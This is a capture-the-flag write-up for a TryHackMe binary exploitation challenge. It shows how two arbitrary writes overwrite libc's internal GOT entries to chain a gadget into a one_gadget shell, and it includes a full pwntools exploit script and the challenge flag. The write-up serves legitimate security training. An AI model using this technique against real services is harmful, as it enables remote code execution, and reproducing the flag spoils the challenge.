Precision - TryHackMe Hackfinity Battle (PWN)

TryHackMe Hard

Flag: THM{t4k3_a_chance_with_precision_THMpwn}

Precision was a binary exploitation challenge in which the main() function offered two absolute-address 8-byte writes. Although the binary applied Full RELRO, libc's internal GOT remained writable. The two writes were chained during perror's internal strlen call to redirect execution to a one-shot gadget, spawning a shell and capturing the flag.

Target

  • IP: 10.67.140.55:9004
  • Binary: precision (PIE, Full RELRO, not stripped)
  • libc: glibc 2.35 (supplied, loaded via custom ld-linux-x86-64.so.2)

Vulnerability

The main() function provides two absolute-address arbitrary 8-byte writes via fread():

void *ptr = (void *)getint();          // user-controlled address (from strtoul)
write(1, "\nFirst chance: ", 15);
fread(ptr, 8, 1, stdin);               // 8-byte write to arbitrary address

void *ptra = (void *)getint();
write(1, "\nSecond chance: ", 16);
fread(ptra, 8, 1, stdin);

After both writes, the binary calls perror("!") then _exit(1337).

The binary's GOT is Full RELRO (read-only), but libc's internal GOT (.got.plt) at offsets 0x219000–0x2191c8 is writable. The leak provides _IO_2_1_stdout_ address, revealing libc base.

Solution

Two writes targeting adjacent libc GOT entries, chained during perror's internal strlen call:

Write 1: got.strlen (libc + 0x219098) → mov rdx, r12 gadget (0x176df7)

The gadget:

mov rdx, r12    ; rdx = r12 (0 at strlen call site)
sub rdx, rsi    ; rdx = 0 (rsi is also 0)
call 0x283e0    ; calls mempcpy PLT stub → GOT[__mempcpy]

Write 2: got.__mempcpy (libc + 0x219040) → one_gadget 0xebcf8

One-gadget constraints: [rsi] == NULL, [rdx] == NULL — satisfied because rsi=0 and the gadget clears rdx.

Chain

perror("!")
  → __fxprintf → __vfprintf_internal
    → strlen()
      → GOT[strlen] (overwritten) → mov rdx, r12 gadget
        → rdx = 0 (envp cleared)
        → call mempcpy PLT
          → GOT[__mempcpy] (overwritten) → one_gadget 0xebcf8
            → execve("/bin/sh", rsi=0, rdx=0) → SHELL

Exploit script

See exploit_writeup.py in this directory.

from pwn import *

HOST = '10.67.140.55'
PORT = 9004
libc = ELF('./libc.so.6')

r = remote(HOST, PORT)
r.recvuntil(b'Coordinates: ')
leak = int(r.recvline().strip(), 16)
libc_base = leak - libc.sym['_IO_2_1_stdout_']

GOT_STRLEN = 0x219098
GOT_MEMPCPY = 0x219040
ONE_GADGET = 0xebcf8
MOV_RDX = 0x176df7

r.sendlineafter(b'>> ', str(libc_base + GOT_STRLEN).encode())
r.sendafter(b'First chance: ', p64(libc_base + MOV_RDX))

r.sendlineafter(b'>> ', str(libc_base + GOT_MEMPCPY).encode())
r.sendafter(b'Second chance: ', p64(libc_base + ONE_GADGET))

r.interactive()

Key insights

  • Full RELRO on the binary is irrelevant — we target libc's writable GOT instead.
  • perror() internally calls strlen via __vfprintf_internal, making got.strlen the ideal hijack point.
  • One-gadget 0xebcf8 needs rdx = 0 (envp). The mov rdx, r12 gadget (0x176df7) clears rdx and then calls through got.__mempcpy, redirecting to the one-gadget with satisfied constraints.
  • The call 0x283e0 inside the gadget is the __mempcpy PLT stub in libc, which jumps through got.__mempcpy.
